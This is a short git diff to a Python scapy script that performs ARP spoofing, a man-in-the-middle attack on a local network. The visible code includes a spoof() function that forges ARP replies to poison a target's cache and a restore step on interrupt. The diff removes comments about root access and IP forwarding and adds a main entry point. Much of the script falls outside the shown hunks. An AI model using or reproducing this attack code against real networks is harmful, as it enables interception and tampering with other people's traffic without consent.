@@ -1,10 +1,5 @@
-# Require
-# sudo su
-# echo 1 > /proc/sys/net/ipv4/ip_forward
-
 import scapy.all as scapy
 import time
-
 
 def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip)
@@ -28,3 +23,6 @@ def main():
     except KeyboardInterrupt:
         restore(ip_gateway, ip_target)
         restore(ip_target, ip_gateway)
+
+if __name__=="__main__":
+    main()
